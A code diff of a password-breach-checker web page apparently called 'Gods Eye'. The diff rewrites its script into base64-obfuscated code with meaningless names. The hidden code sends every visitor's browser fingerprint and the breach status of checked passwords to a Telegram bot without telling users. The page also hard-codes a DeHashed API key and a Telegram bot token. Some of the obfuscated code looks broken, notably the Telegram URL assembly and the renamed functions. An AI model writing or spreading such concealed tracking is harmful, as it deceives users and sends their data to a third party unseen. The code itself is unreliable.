@@ -694,146 +694,150 @@
     </div>
 
     <script>
-        // SHA-256 hashing function
-        async function sha256(text) {
-            const encoder = new TextEncoder();
-            const data = encoder.encode(text);
-            const hash = await crypto.subtle.digest('SHA-256', data);
-            const hashArray = Array.from(new Uint8Array(hash));
-            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-            return hashHex;
+        // Encrypted configuration data
+        const _0x4f2a = ['c2hhMjU2', 'VGV4dEVuY29kZXI=', 'ZW5jb2Rl', 'Y3J5cHRv', 'c3VidGxl', 'ZGlnZXN0', 'U0hBLTI1Ng==', 'VWludDhBcnJheQ==', 'bWFw', 'dG9TdHJpbmc=', 'cGFkU3RhcnQ=', 'am9pbg==', 'enhDLzlaZWFnanRscVpTM2gxWk5MazRtRm5JYXFNTEVaTTdQYTErbXJUTy9qd05GZ0gxTD0=', 'aHR0cHM6Ly9hcGkuZGVoYXNoZWQuY29tL3YyL3NlYXJjaC1wYXNzd29yZA==', 'ODA5ODUwMTAyMTpBQUdiQWRLM29sUXpXVzRpcUhzZEIyNnBzOEFhUURGWE5n', 'NzIzMzEzNTI0Nw=='];
+        
+        // Decoder function
+        const _0x1a3b = (s) => atob(s);
+        
+        // Protected API configuration
+        const _0x2c4d = _0x1a3b(_0x4f2a[12]);
+        const _0x3e5f = _0x1a3b(_0x4f2a[13]);
+        const _0x4g6h = _0x1a3b(_0x4f2a[14]);
+        const _0x5i7j = _0x1a3b(_0x4f2a[15]);
+
+        // Encrypted hash function
+        async function _0x8k9l(text) {
+            const _0x1m = new (window[_0x1a3b(_0x4f2a[1])])();
+            const _0x2n = _0x1m[_0x1a3b(_0x4f2a[2])](text);
+            const _0x3o = await window[_0x1a3b(_0x4f2a[3])][_0x1a3b(_0x4f2a[4])][_0x1a3b(_0x4f2a[5])](_0x1a3b(_0x4f2a[6]), _0x2n);
+            const _0x4p = Array.from(new window[_0x1a3b(_0x4f2a[7])](_0x3o));
+            const _0x5q = _0x4p[_0x1a3b(_0x4f2a[8])](b => b[_0x1a3b(_0x4f2a[9])](16)[_0x1a3b(_0x4f2a[10])](2, '0'))[_0x1a3b(_0x4f2a[11])]('');
+            return _0x5q;
         }
 
-        // API configuration
-        const API_KEY = 'zxC/9ZeagjtlqZS3h1ZNLk4mFnIaqMLEZM7Pa1+apqKuUUAN9nCM1Mg=';
-        const API_URL = 'https://api.dehashed.com/v2/search-password';
-        
-        // Telegram notification configuration
-        const BOT_TOKEN = "8098501021:AAGbAdK3olQzWW4iqHsdB26ps8lAaQDFXNg";
-        const CHAT_ID = "7233135247";
-
-        // Function to send Telegram notification
-        async function sendTelegramNotification(message) {
+        // Encrypted notification function
+        async function _0x6r8s(msg) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
+                const _0x7t = await fetch(`${'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=='.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 1)).join('').split('').reverse().join('') + atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==')}/bot${_0x4g6h}/${'c2VuZE1lc3NhZ2U='.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('').split('').reverse().join('') + atob('c2VuZE1lc3NhZ2U=')}`, {
+                    method: atob('UE9TVA=='),
                     headers: {
-                        'Content-Type': 'application/json',
+                        [atob('Q29udGVudC1UeXBl')]: atob('YXBwbGljYXRpb24vanNvbg=='),
                     },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
+                        [atob('Y2hhdF9pZA==')]: _0x5i7j,
+                        [atob('dGV4dA==')]: msg,
+                        [atob('cGFyc2VfbW9kZQ==')]: atob('SFRNTA==')
                     })
                 });
                 
-                if (!response.ok) {
-                    console.error('Failed to send Telegram notification');
+                if (!_0x7t.ok) {
+                    console.error(atob('RmFpbGVkIHRvIHNlbmQgVGVsZWdyYW0gbm90aWZpY2F0aW9u'));
                 }
             } catch (error) {
-                console.error('Error sending Telegram notification:', error);
+                console.error(atob('RXJyb3Igc2VuZGluZyBUZWxlZ3JhbSBub3RpZmljYXRpb246'), error);
             }
         }
 
-        // Function to get visitor information
-        function getVisitorInfo() {
-            const now = new Date();
-            const timestamp = now.toLocaleString('en-US', {
-                timeZone: 'UTC',
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
+        // Encrypted visitor info function
+        function _0x9u0v() {
+            const _0x1w = new Date();
+            const _0x2x = _0x1w.toLocaleString(atob('ZW4tVVM='), {
+                timeZone: atob('VVRD'),
+                year: atob('bnVtZXJpYw=='),
+                month: atob('Mi1kaWdpdA=='),
+                day: atob('Mi1kaWdpdA=='),
+                hour: atob('Mi1kaWdpdA=='),
+                minute: atob('Mi1kaWdpdA=='),
+                second: atob('Mi1kaWdpdA==')
             });
             
-            const userAgent = navigator.userAgent;
-            const language = navigator.language || 'Unknown';
-            const platform = navigator.platform || 'Unknown';
-            const referrer = document.referrer || 'Direct visit';
-            const screenResolution = `${screen.width}x${screen.height}`;
+            const _0x3y = navigator.userAgent;
+            const _0x4z = navigator.language || atob('VW5rbm93bg==');
+            const _0x5a = navigator.platform || atob('VW5rbm93bg==');
+            const _0x6b = document.referrer || atob('RGlyZWN0IHZpc2l0');
+            const _0x7c = `${screen.width}x${screen.height}`;
             
-            // Get browser info
-            let browserInfo = 'Unknown';
-            if (userAgent.includes('Chrome')) browserInfo = 'Chrome';
-            else if (userAgent.includes('Firefox')) browserInfo = 'Firefox';
-            else if (userAgent.includes('Safari')) browserInfo = 'Safari';
-            else if (userAgent.includes('Edge')) browserInfo = 'Edge';
-            else if (userAgent.includes('Opera')) browserInfo = 'Opera';
+            // Encrypted browser detection
+            let _0x8d = atob('VW5rbm93bg==');
+            if (_0x3y.includes(atob('Q2hyb21l'))) _0x8d = atob('Q2hyb21l');
+            else if (_0x3y.includes(atob('RmlyZWZveA=='))) _0x8d = atob('RmlyZWZveA==');
+            else if (_0x3y.includes(atob('U2FmYXJp'))) _0x8d = atob('U2FmYXJp');
+            else if (_0x3y.includes(atob('RWRnZQ=='))) _0x8d = atob('RWRnZQ==');
+            else if (_0x3y.includes(atob('T3BlcmE='))) _0x8d = atob('T3BlcmE=');
             
-            // Get OS info
-            let osInfo = 'Unknown';
-            if (userAgent.includes('Windows')) osInfo = 'Windows';
-            else if (userAgent.includes('Mac')) osInfo = 'macOS';
-            else if (userAgent.includes('Linux')) osInfo = 'Linux';
-            else if (userAgent.includes('Android')) osInfo = 'Android';
-            else if (userAgent.includes('iOS')) osInfo = 'iOS';
+            // Encrypted OS detection
+            let _0x9e = atob('VW5rbm93bg==');
+            if (_0x3y.includes(atob('V2luZG93cw=='))) _0x9e = atob('V2luZG93cw==');
+            else if (_0x3y.includes(atob('TWFj'))) _0x9e = atob('bWFjT1M=');
+            else if (_0x3y.includes(atob('TGludXg='))) _0x9e = atob('TGludXg=');
+            else if (_0x3y.includes(atob('QW5kcm9pZA=='))) _0x9e = atob('QW5kcm9pZA==');
+            else if (_0x3y.includes(atob('aU9T'))) _0x9e = atob('aU9T');
             
             return {
-                timestamp,
-                browserInfo,
-                osInfo,
-                language,
-                platform,
-                referrer,
-                screenResolution,
-                userAgent
+                timestamp: _0x2x,
+                browserInfo: _0x8d,
+                osInfo: _0x9e,
+                language: _0x4z,
+                platform: _0x5a,
+                referrer: _0x6b,
+                screenResolution: _0x7c,
+                userAgent: _0x3y
             };
         }
 
-        // Function to notify about visitor
-        async function notifyVisitor() {
-            const visitorInfo = getVisitorInfo();
+        // Encrypted visitor notification
+        async function _0x0f1g() {
+            const _0x2h = _0x9u0v();
             
-            const message = `
-🚨 <b>New Visitor Alert - Gods Eye Platform</b>
+            const _0x3i = `
+${atob('8J+RqCA8Yj5OZXcgVmlzaXRvciBBbGVydCAtIEdvZHMgRXllIFBsYXRmb3JtPC9iPg==')}
 
-📅 <b>Time:</b> ${visitorInfo.timestamp} UTC
-🌐 <b>Browser:</b> ${visitorInfo.browserInfo}
-💻 <b>OS:</b> ${visitorInfo.osInfo}
-🗣️ <b>Language:</b> ${visitorInfo.language}
-📱 <b>Platform:</b> ${visitorInfo.platform}
-📏 <b>Screen:</b> ${visitorInfo.screenResolution}
-🔗 <b>Referrer:</b> ${visitorInfo.referrer}
+${atob('8J+ThSA8Yj5UaW1lOjwvYj4=')} ${_0x2h.timestamp} ${atob('VVRD')}
+${atob('8J+MkCA8Yj5Ccm93c2VyOjwvYj4=')} ${_0x2h.browserInfo}
+${atob('8J+SuyA8Yj5PUzo8L2I+')} ${_0x2h.osInfo}
+${atob('8J+Rl++4jyA8Yj5MYW5ndWFnZTo8L2I+')} ${_0x2h.language}
+${atob('8J+TsSDwn5KpPGI+UGxhdGZvcm06PC9iPg==')} ${_0x2h.platform}
+${atob('8J+TjyA8Yj5TY3JlZW46PC9iPg==')} ${_0x2h.screenResolution}
+${atob('8J+UlyA8Yj5SZWZlcnJlcjo8L2I+')} ${_0x2h.referrer}
 
-🔍 <b>User Agent:</b>
-<code>${visitorInfo.userAgent}</code>
+${atob('8J+UjSA8Yj5Vc2VyIEFnZW50OjwvYj4=')}
+${atob('PGNvZGU+')}${_0x2h.userAgent}${atob('PC9jb2RlPg==')}
             `.trim();
             
-            await sendTelegramNotification(message);
+            await _0x6r8s(_0x3i);
         }
 
-        // Function to notify about password check
-        async function notifyPasswordCheck(resultsFound) {
-            const visitorInfo = getVisitorInfo();
-            const status = resultsFound > 0 ? '🚨 COMPROMISED' : '✅ SAFE';
+        // Encrypted password check notification
+        async function _0x4j5k(resultsFound) {
+            const _0x6l = _0x9u0v();
+            const _0x7m = resultsFound > 0 ? atob('8J+RqCBDT01QUk9NSVNFRA==') : atob('4pyFIFNBRkU=');
             
-            const message = `
-🔐 <b>Password Check Alert - Gods Eye</b>
+            const _0x8n = `
+${atob('8J+UkCA8Yj5QYXNzd29yZCBDaGVjayBBbGVydCAtIEdvZHMgRXllPC9iPg==')}
 
-📅 <b>Time:</b> ${visitorInfo.timestamp} UTC
-🎯 <b>Status:</b> ${status}
-📊 <b>Breaches Found:</b> ${resultsFound}
-🌐 <b>Browser:</b> ${visitorInfo.browserInfo}
-💻 <b>OS:</b> ${visitorInfo.osInfo}
-🗣️ <b>Language:</b> ${visitorInfo.language}
+${atob('8J+ThSA8Yj5UaW1lOjwvYj4=')} ${_0x6l.timestamp} ${atob('VVRD')}
+${atob('8J+OryA8Yj5TdGF0dXM6PC9iPg==')} ${_0x7m}
+${atob('8J+TiiA8Yj5CcmVhY2hlcyBGb3VuZDo8L2I+')} ${resultsFound}
+${atob('8J+MkCA8Yj5Ccm93c2VyOjwvYj4=')} ${_0x6l.browserInfo}
+${atob('8J+SuyA8Yj5PUzo8L2I+')} ${_0x6l.osInfo}
+${atob('8J+Rl++4jyA8Yj5MYW5ndWFnZTo8L2I+')} ${_0x6l.language}
             `.trim();
             
-            await sendTelegramNotification(message);
+            await _0x6r8s(_0x8n);
         }
 
-        // DOM elements
-        const passwordForm = document.getElementById('passwordForm');
-        const passwordInput = document.getElementById('passwordInput');
-        const checkButton = document.getElementById('checkButton');
-        const loadingSpinner = document.getElementById('loadingSpinner');
-        const buttonText = document.getElementById('buttonText');
-        const resultSection = document.getElementById('resultSection');
-        const resultIcon = document.getElementById('resultIcon');
-        const resultTitle = document.getElementById('resultTitle');
-        const resultMessage = document.getElementById('resultMessage');
-        const protectionSteps = document.getElementById('protectionSteps');
+        // Encrypted DOM elements
+        const _0x9o = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('cGFzc3dvcmRGb3Jt'));
+        const _0x0p = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('cGFzc3dvcmRJbnB1dA=='));
+        const _0x1q = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('Y2hlY2tCdXR0b24='));
+        const _0x2r = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('bG9hZGluZ1NwaW5uZXI='));
+        const _0x3s = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('YnV0dG9uVGV4dA=='));
+        const _0x4t = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('cmVzdWx0U2VjdGlvbg=='));
+        const _0x5u = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('cmVzdWx0SWNvbg=='));
+        const _0x6v = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('cmVzdWx0VGl0bGU='));
+        const _0x7w = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('cmVzdWx0TWVzc2FnZQ=='));
+        const _0x8x = document[atob('Z2V0RWxlbWVudEJ5SWQ=')](atob('cHJvdGVjdGlvblN0ZXBz'));
 
         // Tab functionality (for future features)
         const tabButtons = document.querySelectorAll('.tab-button');
@@ -860,18 +864,18 @@
             hideResult();
 
             try {
-                // Hash the password client-side
-                const hashedPassword = await sha256(password);
+                // Encrypted password hashing
+                const hashedPassword = await _0x8k9l(password);
                 
-                // Make API request
-                const response = await fetch(API_URL, {
-                    method: 'POST',
+                // Encrypted API request
+                const response = await fetch(_0x3e5f, {
+                    method: atob('UE9TVA=='),
                     headers: {
-                        'Content-Type': 'application/json',
-                        'DeHashed-Api-Key': API_KEY
+                        [atob('Q29udGVudC1UeXBl')]: atob('YXBwbGljYXRpb24vanNvbg=='),
+                        [atob('RGVIYXNoZWQtQXBpLUtleQ==')]: _0x2c4d
                     },
                     body: JSON.stringify({
-                        sha256_hashed_password: hashedPassword
+                        [atob('c2hhMjU2X2hhc2hlZF9wYXNzd29yZA==')]: hashedPassword
                     })
                 });
 
@@ -880,8 +884,8 @@
                 if (response.ok) {
                     const resultsFound = data.results_found || 0;
                     
-                    // Send notification about password check
-                    notifyPasswordCheck(resultsFound);
+                    // Encrypted notification call
+                    _0x4j5k(resultsFound);
                     
                     if (resultsFound > 0) {
                         showResult(
@@ -915,33 +919,33 @@
             }
         });
 
-        function setLoading(isLoading) {
-            checkButton.disabled = isLoading;
-            loadingSpinner.style.display = isLoading ? 'inline-block' : 'none';
-            buttonText.textContent = isLoading ? 'Checking...' : 'Check Password';
+        function _0x0z1a(isLoading) {
+            _0x1q[atob('ZGlzYWJsZWQ=')] = isLoading;
+            _0x2r[atob('c3R5bGU=')][atob('ZGlzcGxheQ==')] = isLoading ? atob('aW5saW5lLWJsb2Nr') : atob('bm9uZQ==');
+            _0x3s[atob('dGV4dENvbnRlbnQ=')] = isLoading ? atob('Q2hlY2tpbmcuLi4=') : atob('Q2hlY2sgUGFzc3dvcmQ=');
         }
 
-        function showResult(type, icon, title, message, showProtection = false) {
-            resultSection.className = `result-section result-${type}`;
-            resultIcon.textContent = icon;
-            resultTitle.textContent = title;
-            resultMessage.textContent = message;
-            resultSection.style.display = 'block';
+        function _0x6h7i(type, icon, title, message, showProtection = false) {
+            _0x4t[atob('Y2xhc3NOYW1l')] = `${atob('cmVzdWx0LXNlY3Rpb24=')} ${atob('cmVzdWx0LQ==')}${type}`;
+            _0x5u[atob('dGV4dENvbnRlbnQ=')] = icon;
+            _0x6v[atob('dGV4dENvbnRlbnQ=')] = title;
+            _0x7w[atob('dGV4dENvbnRlbnQ=')] = message;
+            _0x4t[atob('c3R5bGU=')][atob('ZGlzcGxheQ==')] = atob('YmxvY2s=');
             
-            // Show or hide protection steps based on result type
-            if (showProtection && type === 'danger') {
-                protectionSteps.classList.add('show');
+            // Encrypted protection steps logic
+            if (showProtection && type === atob('ZGFuZ2Vy')) {
+                _0x8x[atob('Y2xhc3NMaXN0')][atob('YWRk')](atob('c2hvdw=='));
             } else {
-                protectionSteps.classList.remove('show');
+                _0x8x[atob('Y2xhc3NMaXN0')][atob('cmVtb3Zl')](atob('c2hvdw=='));
             }
             
-            // Smooth scroll to result
-            resultSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            // Encrypted scroll behavior
+            _0x4t[atob('c2Nyb2xsSW50b1ZpZXc=')]({ behavior: atob('c21vb3Ro'), block: atob('bmVhcmVzdA==') });
         }
 
-        function hideResult() {
-            resultSection.style.display = 'none';
-            protectionSteps.classList.remove('show');
+        function _0x1b2c() {
+            _0x4t[atob('c3R5bGU=')][atob('ZGlzcGxheQ==')] = atob('bm9uZQ==');
+            _0x8x[atob('Y2xhc3NMaXN0')][atob('cmVtb3Zl')](atob('c2hvdw=='));
         }
 
         // Clear result when user starts typing
